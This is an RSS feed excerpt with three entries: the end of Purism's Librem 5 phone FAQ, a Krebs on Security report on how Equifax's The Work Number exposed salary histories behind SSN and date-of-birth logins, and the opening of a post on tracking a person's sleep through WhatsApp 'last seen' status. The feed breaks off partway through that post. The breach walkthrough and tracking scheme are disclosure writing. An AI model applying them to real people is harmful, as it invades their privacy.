&lt;h5&gt;What forms of payment do you accept?&lt;/h5&gt;
&lt;p&gt;Credit Card, Direct Bank Transfer, Bitcoin, and International Wire Transfer. If you need any assistance or alternative options for payment, email ops@puri.sm for assistance.&lt;/p&gt;
&lt;h5&gt;Do you accept Paypal?&lt;/h5&gt;
&lt;p&gt;No, Paypal’s policy does not allow for the full funds to be used as pre-sales, they put a large reserve on crowd-funded presales, and that large reserve severely limits the ability for us to pay for non-recurring engineering, tooling, development, manufacturing, and ship product. If you need any assistance or alternative options for payment (or require a one-off Paypal payment), email ops@puri.sm for assistance.&lt;/p&gt;
&lt;h5&gt;Will the Librem 5 have CE Markings?&lt;/h5&gt;
&lt;p&gt;Yes we will have proper and registered CE markings on the Librem 5 phone, the location of those markings will likely be in the lower back section of the case in a light gray silkscreen, similar to our Librem 15 and Librem 13 laptops.&lt;/p&gt;
&lt;h5&gt;How easy will it be for me to switch from Android or iOS to the Librem 5?&lt;/h5&gt;
&lt;p&gt;For phone calls, email, web browsing, there will be no issues with switching, if you rely upon native applications that are not yet supported, you may need to use HTML5 applications (Social Media, News, Banking), or consider alternatives (e.g. Riot.im vs. Signal). If we reach our stretch goal to run Android applications in isolation, it will become possible for some applications to run.&lt;/p&gt;
&lt;h5&gt;Can I transfer my photos, files, downloads from Android or iOS to the Librem 5?&lt;/h5&gt;
&lt;p&gt;Yes, you will be able to use the phone as a storage device, that can show up on your computer by just plugging in the USB cable and viewing the folders. This will allow you to import or export files, photos, documents, with ease. With the Librem 5 there is no proprietary software that locks your files into proprietary formats, allowing easy sharing of the content you want to share.&lt;/p&gt;
&lt;h5&gt;Will I be able to communicate from my Librem 5 to other phones?&lt;/h5&gt;
&lt;p&gt;Yes, you will be able to make regular unencrypted phone calls to any phone number. You will also be able to communicate securely by using the phone dialing application and messaging application, that can run on the Librem 5 phone, Android based phones, and iOS based phones, and any computing device.&lt;/p&gt;
&lt;h5&gt;Will communicating from my Librem 5 to other phones compromise my privacy or security?&lt;/h5&gt;
&lt;p&gt;The Librem 5 will be the most secure when communicating with another Librem 5 phone, communicating via an encrypted app on a Librem 5 to an Android or iOS encrypted app is the second best option available.&lt;/p&gt;
&lt;h5&gt;Will my existing SIM card work on the Librem 5&lt;/h5&gt;
&lt;p&gt;We aim to support 3G and 4G for the most common international frequency bands and carriers. Exact specifications will follow.&lt;/p&gt;
&lt;h5&gt;Will I be able to use emergency services (e.g. 911 or 999)?&lt;/h5&gt;
&lt;p&gt;Yes, the Librem 5 will work with most carriers, and those carriers support emergency services&lt;/p&gt;
&lt;h5&gt;What countries and mobile networks will support the Librem 5 phone?&lt;/h5&gt;
&lt;p&gt;The Librem 5 is an open network phone, not locked to any particular network. It will work in all countries that provide 2G/3G/4G, GSM, UMTS, or LTE-based network services.&lt;/p&gt;
&lt;h5&gt;Are all hardware components running completely free software, with the source code available?&lt;/h5&gt;
&lt;p&gt;From testing the CPU, GPU, Bootloader and all software will run free software, we are evaluating the WiFi and Bluetooth chips and firmware, this is an area we have to evaluate, finalize, and test. The mobile baseband will most likely use ROM loaded firmware, but a free software kernel driver. We intend to invest time and money toward freeing any non-free firmware.&lt;/p&gt;
&lt;h5&gt;Can the Librem 5 phone run Windows?&lt;/h5&gt;
&lt;p&gt;Very likely, even though we will not expend resources to test this.&lt;/p&gt;
&lt;h5&gt;Can the Librem 5 phone run Android?&lt;/h5&gt;
&lt;p&gt;Very likely, even though we will not expend resources to test this.&lt;/p&gt;
&lt;h5&gt;Can the Librem 5 phone run iOS?&lt;/h5&gt;
&lt;p&gt;Not likely, and we will not expend resources to test this.&lt;/p&gt;
&lt;h5&gt;Will the phone receive updates after launch?&lt;/h5&gt;
&lt;p&gt;Yes, all hardware Purism releases gets regular security and performance updates within PureOS.&lt;/p&gt;
&lt;h5&gt;Can the phone runs Qubes OS like Librem laptops?&lt;/h5&gt;
&lt;p&gt;No, Qubes OS requires virtualization on the CPU, and the Librem 5’s CPU will not offer that. The Librem laptops do support VT-d and VT-x and therefore support running Qubes OS.&lt;/p&gt;
&lt;h5&gt;What if you don’t reach the funding target?&lt;/h5&gt;
&lt;p&gt;It will show that there is not enough interest in producing a device that focuses on security, privacy, and digital rights, which will be a tremendous social disappointment. If we don’t reach our target then all contributions will be fully refunded.&lt;/p&gt;
&lt;h5&gt;Will Twitter, Fandango, My Bank, etc. work on a Librem 5 phone?&lt;/h5&gt;
&lt;p&gt;Yes, any web based app will work through the browser. Over time these sites will either use progressive web applications, or could have a native app.&lt;/p&gt;
&lt;h5&gt;Will you have a calendar app, maps app, notepad app, etc. by default?&lt;/h5&gt;
&lt;p&gt;Our first version will be focusing on phone calling, encrypted communication, and web browsing. However the free software community is encouraged to test, port, author, and get involved to take all the great free software applications that exist already and make it work on a 5″ screen.&lt;/p&gt;
&lt;h5&gt;Will I be able to open word or excel documents sent via email?&lt;/h5&gt;
&lt;p&gt;At delivery we do not plan to support the reader or renderer for these proprietary formats, but this is a top priority to solve after product delivery.&lt;/p&gt;
&lt;h5&gt;Will there be hardware kill switches?&lt;/h5&gt;
&lt;p&gt;Yes, we need to evaluate the wiring and design limitations to determine the best approach; the intention is to include Camera, Microphone, WiFi/Bluetooth, and Baseband Modem kill switches or some combination. We may utilize a microphone headphone jack plug to kill the microphone at the hardware level as an example of some inventions we are testing and considering. But rest assured we will have hardware kill switches.&lt;/p&gt;
&lt;h5&gt;Can I remove the battery and replace it?&lt;/h5&gt;
&lt;p&gt;Yes, like all Purism products, the case itself will allow you to access the insides, and the battery will be modular and can be replaced with ease.&lt;/p&gt;
&lt;h5&gt;Does Purism comply with &lt;a href=&quot;https://en.wikipedia.org/wiki/Communications_Assistance_for_Law_Enforcement_Act&quot; target=&quot;_blank&quot;&gt;CALEA&lt;/a&gt; requirements?&lt;/h5&gt;
&lt;p&gt;No, because CALEA applies to US based telecommunications providers, not to Purism. If the user of a Librem 5 phone uses a carrier in the US with a traditional “phone number”, that carrier must comply with CALEA for phone calls, as the phone call is sent over the carrier’s connection. Pure Matrix-to-Matrix calls are outside of CALEA requirements (Matrix nor Purism are telecommunications service providers). If the call touches the &lt;a href=&quot;https://en.wikipedia.org/wiki/Pstn&quot; target=&quot;_blank&quot;&gt;PSTN&lt;/a&gt; is becomes the carrier’s responsibility to adhere to CALEA. Matrix is an encrypted voip/messaging protocol not a telco.&lt;/p&gt;
&lt;h5&gt;Will this run coreboot and have the Intel ME neutralized?&lt;/h5&gt;
&lt;p&gt;The Librem 5 will not be Intel based, it will be i.MX 6/8 based, so therefore we don’t need coreboot nor the Management Engine. The i.MX 6/8 CPU will be completely free software without any binaries whatsoever!&lt;/p&gt;
&lt;h5&gt;Why don’t you build a free UI ontop of Mer (Sailfish OS)? Or resurrect Firefox OS? Or insert-name-here?&lt;/h5&gt;
&lt;p&gt;Because we want to promote a pure and unified stack, not have a separate mobile OS with proprietary bits or a completely different middleware stack. We want to support the community efforts of GNOME and KDE*, and allow for any GNU+Linux to work out-of-the-box providing mainline improvements that work not just on mobile but across the device spectrum. The Librem 5 is a new approach to use a regular Linux system and adopt it to mobile use-cases instead of creating a completely new system. We do not create a walled garden, instead we tear down these walls, creating an open utopia. A fully standards-based freedom-oriented system, based on Debian and many other upstream projects, has never been done before–we will be the first to seriously attempt this.&lt;/p&gt;
&lt;p&gt;You can also learn more about our position on GNOME and KDE further below in this FAQ.&lt;/p&gt;
&lt;h5&gt;Will the Librem 5 be able to run &lt;a href=&quot;https://anbox.io&quot; target=&quot;_blank&quot;&gt;Anbox&lt;/a&gt; or &lt;a href=&quot;http://www.shashlik.io&quot; target=&quot;_blank&quot;&gt;Shashlik&lt;/a&gt;?&lt;/h5&gt;
&lt;p&gt;We will test the capabilities of powering Anbox or Shashlik to allow users the ability to run Android applications within PureOS on the Librem 5, but our long-term goal is to utilize native applications that adhere to our strict philosophy. Enterprise clients or users who require Android applications may choose to to run a Android applications within an isolation container, so this is the reason for testing this type of configuration. We have a stretch goal to help with this developmental effort to have Android apps run in isolation.&lt;/p&gt;
&lt;h5&gt;What hardware specifications are subject to change?&lt;/h5&gt;
&lt;p&gt;RAM, Storage, USB version and type, WiFi version, Bluetooth version, Screen type, Screen resolution are the important things that are subject to change based on supplier availability, and software and driver support.&lt;/p&gt;
&lt;h5&gt;What is the RAM/Drive configuration?&lt;/h5&gt;
&lt;p&gt;Purism plans to max-out the CPU’s RAM and Drive according to the best capabilities during testing, and have listed the minimum confirmed specifications on the campaign page.&lt;/p&gt;
&lt;h5&gt;What detailed hardware specs can be provided, and when?&lt;/h5&gt;
&lt;p&gt;The detailed specifications will be released as we firm up the hardware choices, it will be ongoing communication during the research phase.&lt;/p&gt;
&lt;h5&gt;What CPU will be used, i.MX 6 or i.MX 8?&lt;/h5&gt;
&lt;p&gt;We started prototyping with the i.MX 6, and are &lt;a href=&quot;https://puri.sm/posts/librem5-roadmap-to-imx8/&quot; target=&quot;_blank&quot;&gt;getting close&lt;/a&gt; to be able to fully confirm the possibility of using i.MX 8. We want to &lt;strong&gt;know&lt;/strong&gt; we can use i.MX 8 for sure. The i.MX8 would be pretty ideal for us, it has much more computational power while at the same time reducing power consumption since it uses a more recent production technology. It is especially designed for mobile use. The i.MX 8M or i.MX 8X seem like the ones we would want. But they have two areas we will be closely following; we will be getting new prototypes in November 2017. The i.MX 8 will have a new, more recent GPU, a dual core Vivante GC7000Lite which is not yet supported by the free Etnaviv driver. The big questions are, when will silicon become available and when will decent Linux support be available for it? So we will keep evaluating after the campaign ends and decide i.MX 6 or do we get to fully move to i.MX 8.&lt;/p&gt;
&lt;h5&gt;What warranties apply to the Librem 5 phone?&lt;/h5&gt;
&lt;p&gt;Our standard 1yr parts and labor warranty applies. Also if you are not happy with the product, you may return it within 30 days of receiving it for a full refund. Purism will not cover the cost of return postage and packaging.&lt;/p&gt;
&lt;h5&gt;Will this be an “open hardware” design?&lt;/h5&gt;
&lt;p&gt;Our intention is to have everything freed down to the schematic level, but have not cleared all design, patents, legal, and contractual details. We will continue to advance toward this goal as it aligns with our long-term beliefs.&lt;/p&gt;
&lt;h5&gt;Why not use Wire, Telegram, WhatsApp, or Signal?&lt;/h5&gt;
&lt;p&gt;While these all provide encryption, and some do release the client software under acceptable licensing terms, they all are walled gardens wanting you to register with them, and their server software is proprietary and therefore not acceptable to us. &lt;a href=&quot;https://matrix.org&quot; target=&quot;_blank&quot;&gt;Matrix&lt;/a&gt; is the proper solution and that is why we have partnered with them.&lt;/p&gt;
&lt;h5&gt;Will you be seeking &lt;a href=&quot;http://fsf.org&quot; target=&quot;_blank&quot;&gt;FSF&lt;/a&gt; RYF endorsement?&lt;/h5&gt;
&lt;p&gt;We will constantly keep FSF up-to-date on the hardware and software, our current understanding is any non-free kernel firmware needed for RF chips will not meet the RYF qualifications today, so we will continue to evaluate the WiFi and Bluetooth cards in the hopes to advance toward RYF. The end goal for us is to gain RYF for all Purism products.&lt;/p&gt;
&lt;h5&gt;Will you be running GNOME, Plasma, or your own custom UI?&lt;/h5&gt;
&lt;p&gt;We will be working with both GNOME/GTK and KDE/Plasma communities, and have partnered with the foundations behind them for the middleware layer. PureOS currently is GNOME-based and our great experience with working with GNOME as an upstream as well as GNOME’s OS and design-centric development model; however we will also test, support, and develop with KDE and the KDE community, and of course we will support Qt for application development. We will continue to test GNOME and Plasma, and should have a final direction within a month after funding success. Whatever is chosen, Purism will be working with both communities in an upstream-first fashion.&lt;/p&gt;
&lt;p&gt;Learn more about &lt;a href=&quot;https://puri.sm/posts/librem5-gnome-and-kde-collaboration/&quot; target=&quot;_blank&quot;&gt;the rationale behind this approach&lt;/a&gt;.&lt;/p&gt;
&lt;h5&gt;Will the phone have a fingerprint reader, or other biometric access?&lt;/h5&gt;
&lt;p&gt;No, we will not be shipping with any biometric hardware, the reasons for this is because single access via biometrics does not prevent access to your phone the same way a security code or lock does. The US Supreme Court has alluded to biometric access not protecting you the same way that a security code from memory (a security code) does (e.g. You can say “no” to a passphrase, or security code, but you cannot say “no” to biometric (physical) information). So even if in future models of the Librem 5 phone we do include biometric hardware, we will be double-locking it with a security code, to have the best security story we can for users.&lt;/p&gt;
&lt;h5&gt;Can I come work for you?&lt;/h5&gt;
&lt;p&gt;We are actively hiring. Please visit &lt;a href=&quot;https://puri.sm/jobs/&quot; target=&quot;_blank&quot;&gt;https://puri.sm/jobs/&lt;/a&gt; and take a look. We are mostly interested in eager, self motivated, free software enthusiasts who want to change the world for the better.&lt;/p&gt;
&lt;h5&gt;Can I invest in Purism?&lt;/h5&gt;
&lt;p&gt;Yes, please reach out to &lt;a href=&quot;mailto:ir@puri.sm&quot;&gt;ir@puri.sm&lt;/a&gt; (Investor Relations), and you will get a reply within 24 hours to discuss the opportunity.&lt;/p&gt;
&lt;h5&gt;I don’t see my question, how can I get it answered?&lt;/h5&gt;
&lt;p&gt;Please email &lt;a href=&quot;mailto:support@puri.sm&quot;&gt;support@puri.sm&lt;/a&gt; and we will answer you, and if it applies to the general audience we will post it here!&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2017/06/supporters-1024x248.png&quot; alt=&quot;&quot; width=&quot;960&quot; height=&quot;233&quot; class=&quot;alignnone size-large wp-image-21171&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2017/06/supporters-1024x248.png 1024w, https://puri.sm/wp-content/uploads/2017/06/supporters-300x73.png 300w, https://puri.sm/wp-content/uploads/2017/06/supporters-768x186.png 768w&quot; sizes=&quot;(max-width: 960px) 100vw, 960px&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 09 Oct 2017 19:29:04 +0000</pubDate>
<dc:creator>mike-cardwell</dc:creator>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://puri.sm/shop/librem-5/</dc:identifier>
</item>
<item>
<title>Equifax Breach Fallout: Your Salary History</title>
<link>https://krebsonsecurity.com/2017/10/equifax-breach-fallout-your-salary-history/</link>
<guid isPermaLink="true" >https://krebsonsecurity.com/2017/10/equifax-breach-fallout-your-salary-history/</guid>
<description>&lt;p&gt;In May, KrebsOnSecurity &lt;a href=&quot;https://krebsonsecurity.com/2017/05/fraudsters-exploited-lax-security-at-equifaxs-talx-payroll-division/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;broke a story about lax security at a payroll division&lt;/a&gt; of big-three credit bureau &lt;strong&gt;Equifax&lt;/strong&gt; that let identity thieves access personal and financial data on an unknown number of Americans. Incredibly, this same division makes it simple to access detailed salary and employment history on a large portion of Americans using little more than someone’s Social Security number and date of birth — both data elements that were stolen in &lt;a href=&quot;https://krebsonsecurity.com/2017/09/breach-at-equifax-may-impact-143m-americans/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;the recent breach at Equifax&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-medium wp-image-41054&quot; src=&quot;https://krebsonsecurity.com/wp-content/uploads/2017/10/twn-580x226.png&quot; alt=&quot;twn&quot; width=&quot;580&quot; height=&quot;226&quot; srcset=&quot;https://krebsonsecurity.com/wp-content/uploads/2017/10/twn-580x226.png 580w, https://krebsonsecurity.com/wp-content/uploads/2017/10/twn-768x300.png 768w, https://krebsonsecurity.com/wp-content/uploads/2017/10/twn.png 864w&quot; sizes=&quot;(max-width: 580px) 100vw, 580px&quot; /&gt;&lt;/p&gt;
&lt;p&gt;At issue is a service provided by Equifax’s &lt;a href=&quot;https://krebsonsecurity.com/?s=talx&amp;amp;x=0&amp;amp;y=0&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;TALX division&lt;/a&gt; called &lt;a href=&quot;https://www.theworknumber.com/Employees/index.asp&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;The Work Number&lt;/a&gt;. The service is designed to provide automated employment and income verification for prospective employers, and tens of thousands of companies report employee salary data to it. The Work Number also allows anyone whose employer uses the service to provide proof of their income when purchasing a home or applying for a loan.&lt;/p&gt;
&lt;p&gt;The homepage for this Equifax service wants to assure visitors that “Your personal information is protected.”&lt;/p&gt;
&lt;p&gt;“With your consent your personal data can be retrieved only by credentialed verifiers,” Equifax assures us, referring mainly to banks and other entities that request salary data for purposes of setting credit limits.&lt;/p&gt;
&lt;p&gt;Sadly, this isn’t anywhere near true because most employers who contribute data to The Work Number — including Fortune 100 firms, government agencies and universities — rely on horribly weak authentication for access to the information.&lt;/p&gt;
&lt;p&gt;To find out how easy it is to view your detailed salary history, you’ll need your employer’s name or employer code. Helpfully, &lt;a href=&quot;https://secure.theworknumber.talx.com/popups/findEmployer.aspx?searchcriteria=&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;this page&lt;/a&gt; lets you look that up quite easily (although if you opt to list employers alphabetically by the first letter of the company name, there are so many entries for each letter that I found Equifax’s database simply crashes half the time instead of rendering the entire list).&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-medium wp-image-41055&quot; src=&quot;https://krebsonsecurity.com/wp-content/uploads/2017/10/findemployercode-580x147.png&quot; alt=&quot;findemployercode&quot; width=&quot;580&quot; height=&quot;147&quot; srcset=&quot;https://krebsonsecurity.com/wp-content/uploads/2017/10/findemployercode-580x147.png 580w, https://krebsonsecurity.com/wp-content/uploads/2017/10/findemployercode-768x194.png 768w, https://krebsonsecurity.com/wp-content/uploads/2017/10/findemployercode-940x238.png 940w, https://krebsonsecurity.com/wp-content/uploads/2017/10/findemployercode.png 1150w&quot; sizes=&quot;(max-width: 580px) 100vw, 580px&quot; /&gt;&lt;/p&gt;
&lt;p&gt;What’s needed to access your salary and employment history? &lt;a href=&quot;https://secure.theworknumber.talx.com/twneeer/PreAuthenticated/EnterEmployerSearchCriteria.ascx?ReturnUrl=%2ftwneeer%2femployee%2fpostauthenticated%2fapplicationsequenceerror.ascx&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Go here&lt;/a&gt;, and enter the employer name or employer code. After that, it asks for a “user ID.” This might sound like privileged information, but in most cases this is just the employees’s Social Security number (or a portion of it).&lt;/p&gt;
&lt;p&gt;At the next step, the site asks visitors to “enter your PIN,” short for Personal Identification Number. However, in the vast majority of cases this appears to be little more than someone’s eight-digit date of birth. The formats differ by employer, but it’s usually either yyyy/mm/dd or mm/dd/yyyy, without the slashes.&lt;/p&gt;
&lt;p&gt;Successful validation to the system produces two sets of data: An employee’s salary and employment history going back at least a decade, and a report listing all of the entities (ostensibly, the aforementioned “credentialed verifiers”) that have previously requested and viewed this information.&lt;/p&gt;
&lt;p&gt;Once you’re successfully “authenticated,” the system asks you to change your PIN to something more secret than your birthday. When the default PIN is changed, The Work Number prompts users to select a series of six challenge/response questions, which Equifax claims will “improve the security of your data and create an extra layer of protection on your account.”&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Unfortunately, consumers whose employee history is stored by this service effectively have no privacy or security unless they possess both the awareness that this service exists and the forethought to access their account online before identity thieves or others do it first.&lt;/em&gt;&lt;span id=&quot;more-41048&quot;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-medium wp-image-41056&quot; src=&quot;https://krebsonsecurity.com/wp-content/uploads/2017/10/newpin-580x645.png&quot; alt=&quot;newpin&quot; width=&quot;580&quot; height=&quot;645&quot; srcset=&quot;https://krebsonsecurity.com/wp-content/uploads/2017/10/newpin-580x645.png 580w, https://krebsonsecurity.com/wp-content/uploads/2017/10/newpin.png 646w&quot; sizes=&quot;(max-width: 580px) 100vw, 580px&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The Work Number does allow employers to opt for TALX’s “enhanced authentication” feature, wherein after logging in with your employer ID and PIN (often the last four digits of an SSN plus the birth year), the system is designed to require the requester to respond to an email at a work address or a phone call to a work number to validate the login.&lt;/p&gt;
&lt;p&gt;However, I did not find this to be the case in several instances involving readers whose employers supposedly used this enhanced authentication method. In cases where corporate human resources departments fail to populate employee email addresses and phone numbers, the system defaults to asking visitors to enter &lt;em&gt;any email address and phone number&lt;/em&gt; to complete the validation. This is &lt;a href=&quot;http://www.theworknumber.com/Authentication/HelpTWNEEER/docs/RSA_enroll_employee.pdf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;detailed here&lt;/a&gt; (PDF), wherein The Work Number states “if you do not have the required phone and e-mail information on file, you will be prompted to update/add your phone numbers/email addresses.”&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;aligncenter size-full wp-image-41072&quot; src=&quot;https://krebsonsecurity.com/wp-content/uploads/2017/10/squestionsa.png&quot; alt=&quot;squestionsa&quot; width=&quot;575&quot; height=&quot;456&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Worse yet, while companies that use this service tend to vary their approaches to what’s required in terms of user IDs and PINs, a great many employers publish online detailed instructions on how to fill out these various forms. For example, the &lt;strong&gt;State of California&lt;/strong&gt;‘s process is listed &lt;a href=&quot;http://www.sco.ca.gov/Files-PPSD/empinfo_howto_wrknumber_STD500.pdf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;here&lt;/a&gt; (PDF); instructions for the &lt;strong&gt;Health Resources &amp;amp; Services Administration&lt;/strong&gt; (HRSA) are &lt;a href=&quot;https://www.hrsa.gov/hr/talx/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;here&lt;/a&gt;; employees at the &lt;strong&gt;National Institutes of Health&lt;/strong&gt; (NIH) can learn the steps by consulting &lt;a href=&quot;https://www.niehs.nih.gov/about/assets/docs/salary_key_508.pdf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;this document&lt;/a&gt; (PDF). The process for getting this information on current and former &lt;strong&gt;UCLA&lt;/strong&gt; employees is spelled out &lt;a href=&quot;https://www.finance.ucla.edu/payroll/news-events/employment-income-verification-through-the-work-number&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;here&lt;/a&gt;. There are countless other examples that are easy to find with a simple Internet search.&lt;/p&gt;
&lt;p&gt;Many readers probably consider their current and former salaries to be very private information, but as we can see this data is easily available on a broad spectrum of the working population in America today. The information needed to obtain it has been widely compromised in thousands of data breaches over the past few years, and the SSN and DOB on most Americans is for sale in a variety of places online. In short, if you can get these details from Equifax’s online service, so can anyone else.&lt;/p&gt;
&lt;p&gt;Fortunately, you can reduce the likelihood that an acquaintance, co-worker, stalker or anyone else can do this by claiming your own account, changing the PIN and selecting a half-dozen security questions and answers. As always, it’s best not to answer these questions truthfully, but to input answers that only you will know and that can’t be found using social networking sites or other public data sources.&lt;/p&gt;
&lt;p&gt;I could see this service potentially helping to create a toxic workplace environment because it offers a relatively simple method for employees to glean data about the salaries of their co-workers and bosses. While some people believe that companies should be more transparent about employee salaries, this data in the wrong hands very often generates a great deal of resentment and hostility among co-workers.&lt;/p&gt;
&lt;p&gt;Employers who use The Work Number should strongly consider changing as many defaults as possible, and truly implementing the service’s enhanced authentication features.&lt;/p&gt;
&lt;p&gt;October is &lt;strong&gt;National Cybersecurity Awareness Month&lt;/strong&gt;, and as such KrebsOnSecurity will continue pointing readers to similar services that let anyone access your personal data armed with little more than static identifiers about you that should no longer be considered private. Although some readers may take issue with my pointing these out — reasoning that I’m only making it easier for bad people to do bad things — it’s important to understand that knowledge is half the battle: Planting your flag before someone else does is usually the only way to keep others from abusing such services to expose your personal information.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update, Oct. 9, 10:00 a.m. ET:&lt;/strong&gt; The Work Number site is currently down for maintenance. &lt;a href=&quot;https://status.equifaxworkforce.com/&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;A notice on the site&lt;/a&gt; says the company took the portal down a few hours after my story was published yesterday, without the usual advance warning the company offers for scheduled maintenance. The notice reads:&lt;/p&gt;
&lt;p&gt;“Equifax Workforce Solutions is currently performing maintenance activities that will affect the following applications:&lt;/p&gt;
&lt;p&gt;The Work Number EDR”&lt;/p&gt;
&lt;p&gt;“We apologize for any inconvenience this may cause, but it is necessary to ensure&lt;br /&gt;that Equifax Workforce Solutions continues to provide you the industry-leading services you&lt;br /&gt;have come to expect.”&lt;/p&gt;
&lt;p&gt;Also, several readers pointed out that when they tried the service Sunday evening before Equifax took it down they were asked to answer knowledge-based authentication questions before being able to authenticate to the portal to view their salary history. While this is a welcome additional step, regular readers here know how easy it is for ID thieves to bypass these multiple-guess questions (as the answers usually are available using sites like Zillow and Spokeo, to say nothing of social networking profiles).&lt;/p&gt;
&lt;p&gt;Related reading:&lt;/p&gt;
&lt;p&gt;–&lt;a href=&quot;https://krebsonsecurity.com/2017/10/usps-informed-delivery-is-stalkers-dream/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;USPS ‘Informed Delivery’ is Stalker’s Dream&lt;/a&gt;&lt;br /&gt;–&lt;a href=&quot;https://krebsonsecurity.com/2017/03/student-aid-tool-held-key-for-tax-fraudsters/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Student Aid Tool Held Key for Tax Fraudsters&lt;/a&gt;&lt;br /&gt;–&lt;a href=&quot;https://krebsonsecurity.com/2015/03/sign-up-at-irs-gov-before-crooks-do-it-for-you/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Sign Up at IRS.gov Before Crooks Do It For You&lt;/a&gt;&lt;br /&gt;–&lt;a href=&quot;https://krebsonsecurity.com/2013/09/crooks-hijack-retirement-funds-via-ssa-portal/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Crooks Hijack Retirement Funds via SSA Portal&lt;/a&gt;&lt;br /&gt;–&lt;a href=&quot;https://krebsonsecurity.com/2016/08/social-security-administration-now-requires-two-factor-authentication/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Social Security Administration Now Requires Two-Factor Authentication&lt;/a&gt;&lt;br /&gt;–&lt;a href=&quot;https://krebsonsecurity.com/2016/08/ssa-ixnay-on-txt-msg-reqmnt-4-e-acct-sry/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;SSA: Ixnay on txt msg reqmnt 4 e-acct, sry&lt;/a&gt;&lt;/p&gt;


&lt;p class=&quot;small&quot;&gt;Tags: &lt;a href=&quot;https://krebsonsecurity.com/tag/equifax/&quot; rel=&quot;tag&quot;&gt;Equifax&lt;/a&gt;, &lt;a href=&quot;https://krebsonsecurity.com/tag/national-cybersecurity-awareness-month/&quot; rel=&quot;tag&quot;&gt;National Cybersecurity Awareness Month&lt;/a&gt;, &lt;a href=&quot;https://krebsonsecurity.com/tag/talx/&quot; rel=&quot;tag&quot;&gt;TALX&lt;/a&gt;, &lt;a href=&quot;https://krebsonsecurity.com/tag/the-work-number/&quot; rel=&quot;tag&quot;&gt;The Work Number&lt;/a&gt;&lt;/p&gt;
&lt;p class=&quot;postmetadata alt&quot;&gt;&lt;small&gt;This entry was posted on Sunday, October 8th, 2017 at 2:56 pm and is filed under &lt;a href=&quot;https://krebsonsecurity.com/category/other/&quot; rel=&quot;category tag&quot;&gt;Other&lt;/a&gt;. You can follow any comments to this entry through the &lt;a href=&quot;https://krebsonsecurity.com/2017/10/equifax-breach-fallout-your-salary-history/feed/&quot;&gt;RSS 2.0&lt;/a&gt; feed. You can skip to the end and leave a comment. Pinging is currently not allowed.&lt;/small&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 09 Oct 2017 18:37:04 +0000</pubDate>
<dc:creator>ilamont</dc:creator>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://krebsonsecurity.com/2017/10/equifax-breach-fallout-your-salary-history/</dc:identifier>
</item>
<item>
<title>Tracking friends and strangers using WhatsApp</title>
<link>https://robertheaton.com/2017/10/09/tracking-friends-and-strangers-using-whatsapp/</link>
<guid isPermaLink="true" >https://robertheaton.com/2017/10/09/tracking-friends-and-strangers-using-whatsapp/</guid>
<description>&lt;p&gt;09 Oct 2017&lt;/p&gt;
&lt;p&gt;You and your good buddy, Steve Steveington, are in training for an arduous charity walk. You signed up together on the spur of the moment and pledged to hold each other accountable whilst you got in shape for the big day. However, you have developed reason to suspect that Steve Steveington is losing his commitment to the plan and is staying up until the early hours of the morning partying at nightclubs or playing Call of Duty. This is unacceptable - if he falls behind because he didn’t take your training program seriously then you’re not going to be the one to drag him round the punishing 5km course.&lt;/p&gt;
&lt;p&gt;However, he insists he is getting the 8.5 hours a night that your program calls for. You are going to have to find proof of his transgressions and confront him with it. You start scheming. You have heard that you can track people’s sleep patterns using their online status in &lt;a href=&quot;https://defaultnamehere.tumblr.com/post/139351766005/graphing-when-your-facebook-friends-are-awake&quot;&gt;Facebook Messenger&lt;/a&gt;. However, this requires you to be friends with your target, and the Stevester blocked you after the &lt;a href=&quot;https://robertheaton.com/2014/12/08/fun-with-your-friends-facebook-and-tinder-session-tokens/&quot;&gt;Tinder incident a few months ago&lt;/a&gt;. You consider hiring a private eye, but then you realize that you can perform the same status-tracking trick using SS’s WhatsApp account and the “last seen” feature. This is just as well, because you have already spent almost all of your savings on energy bars and headbands.&lt;/p&gt;
&lt;p&gt;The plan is simple. Every 10 seconds, you check your target’s WhatsApp status, and note if they are online or not. For avid users, like Mr Steveington, their first and last times on the app each day will be very close to when they wake up and go to sleep. If SS goes offline between 1100PM and 0730AM each day, you can infer that he is following the plan and just seems dull and sluggish because he is a dull and sluggish person. However, if he instead only goes dark between 0300AM and 0800AM, you know that he is skimping on sleep to either party or play computer games in his underwear. As a side-benefit, you hope that you may be able to infer things like the number of times he wakes up during the night and the waxing and waning of his social life.&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;img src=&quot;https://robertheaton.com/images/whatsapptracker1.png&quot;/&gt;&lt;/p&gt;
